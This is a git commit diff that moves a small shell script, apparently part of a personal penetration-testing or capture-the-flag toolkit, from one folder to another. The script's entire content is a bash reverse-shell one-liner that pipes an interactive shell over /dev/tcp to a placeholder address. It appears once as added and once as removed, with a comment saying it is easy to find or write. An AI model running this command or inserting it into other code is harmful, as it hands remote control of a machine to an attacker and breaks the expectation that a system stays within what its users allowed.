1f46b5f405e61631bc1799d69fa26f0c908ec099
Pacifica0cean <115663211+Pacifica0cean@users.noreply.github.com>
2022-11-03 21:32:45 +0000

    Moved.

---
+++ Tools/Local/reverseshell.sh
@@ -0,0 +1,4 @@
+## This can be found online practically anywhere and is easy to write yourself.
+
+bash -i >& /dev/tcp/10.10.XX.XX/XXXX 0>&1
+
--- Tools/reverseshell.sh
+++
@@ -1,2 +0,0 @@
-bash -i >& /dev/tcp/10.10.XX.XX/XXXX 0>&1
-
